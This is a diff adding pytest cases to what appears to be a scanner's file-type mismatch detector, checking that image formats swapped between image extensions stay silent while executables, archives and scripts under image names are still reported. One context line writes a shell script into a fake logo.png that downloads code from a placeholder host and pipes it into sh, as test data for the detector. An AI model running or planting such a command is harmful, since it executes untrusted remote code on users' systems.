@@ -2353,3 +2353,89 @@ class TestAGitLfsPointerIsNotAForgery:
         static.mkdir()
         (static / "logo.png").write_bytes(b"#!/bin/sh\ncurl https://x.test/p | sh\n")
         assert "SUSPECT.POLYGLOT.MISMATCH.001" in flagged(tmp_path)
+
+
+class TestTwoImageFormatsConfusedIsNotADisguise:
+    """`geekxh/hello-algorithm` produced 458 blocking findings and every one of them was
+    a PNG saved under a `.jpg` name -- screenshots exported by a tool that writes PNG
+    bytes whatever the filename says. Across the 1,487-repository corpus, image
+    extensions accounted for 1,866 of the 1,980 format-mismatch findings.
+
+    None of them is the thing the rule exists for. A polyglot is a file arranged so that
+    the thing INSPECTING it and the thing RUNNING it disagree, and the disagreement is
+    only a finding when the content can do something the name does not admit to: an
+    executable, an archive, a script. A PNG named `.jpg` renders as an image either way,
+    executes nothing either way, and conceals nothing from anybody.
+
+    So the comparison is between KINDS, not names. Within a kind it is a naming error and
+    silent; across kinds it is reported, and the message now says which way round.
+    """
+
+    PNG = b"\x89PNG\r\n\x1a\n" + b"\x00" * 64
+    JPEG = b"\xff\xd8\xff" + b"\x00" * 64
+    GIF = b"GIF8" + b"\x00" * 64
+
+    @pytest.mark.parametrize(
+        ("path", "raw"),
+        [
+            ("docs/1.jpg", PNG),
+            ("docs/1.jpeg", PNG),
+            ("docs/shot.png", JPEG),
+            ("docs/shot.png", GIF),
+            ("docs/anim.gif", PNG),
+        ],
+    )
+    def test_an_image_under_another_image_name_is_silent(self, path: str, raw: bytes) -> None:
+        assert BinaryDetector.mismatch(path, BinaryDetector.identify(raw)) is None
+
+    def test_a_gzip_named_zip_is_silent(self) -> None:
+        """Same reasoning one kind over: `.tar.gz` renamed to `.zip` is somebody's
+        download script, not a forgery."""
+        assert (
+            BinaryDetector.mismatch("dist/x.zip", BinaryDetector.identify(b"\x1f\x8b\x08\x00"))
+            is None
+        )
+
+    @pytest.mark.parametrize(
+        ("path", "raw"),
+        [
+            ("static/logo.png", ELF),
+            ("static/logo.png", b"#!/bin/sh\necho x\n"),
+            ("static/logo.png", b"PK\x03\x04rest"),
+            ("static/photo.jpg", b"MZ\x90\x00" + b"\x00" * 40),
+            ("docs/manual.pdf", PNG),
+        ],
+    )
+    def test_a_different_kind_is_still_reported(self, path: str, raw: bytes) -> None:
+        """The guard, in both directions. An image extension over an executable, an
+        archive or a script is the finding; so is a document extension over an image,
+        because the name still promises something the bytes are not."""
+        assert BinaryDetector.mismatch(path, BinaryDetector.identify(raw)) is not None
+
+    def test_the_message_names_both_kinds(self) -> None:
+        message = BinaryDetector.mismatch("static/logo.png", BinaryDetector.identify(ELF))
+        assert message is not None
+        assert "an executable rather than an image" in message
+
+    @pytest.mark.parametrize(
+        ("path", "raw"),
+        [
+            ("lib/x.so", b"#!/bin/sh\necho x\n"),
+            ("lib/x.dylib", JAVA_CLASS),
+        ],
+    )
+    def test_executables_are_not_interchangeable(self, path: str, raw: bytes) -> None:
+        """The narrowness of the exemption, stated as a test. Both of these are one kind
+        -- executable -- and both stay reported: a script wearing a native library's name
+        is the substitution the rule was written for, and comparing kinds alone would have
+        silenced it. Only `INTERCHANGEABLE_KINDS` is exempt, and it holds two entries."""
+        assert BinaryDetector.mismatch(path, BinaryDetector.identify(raw)) is not None
+
+    def test_the_repository_shape_produces_nothing(self, tmp_path) -> None:
+        """End to end, as the repository was laid out: a directory of numbered
+        screenshots, all PNG bytes, all named `.jpg`."""
+        shots = tmp_path / "sourcefile" / "701"
+        shots.mkdir(parents=True)
+        for index in range(1, 9):
+            (shots / f"{index}.jpg").write_bytes(self.PNG)
+        assert "SUSPECT.POLYGLOT.MISMATCH.001" not in flagged(tmp_path)
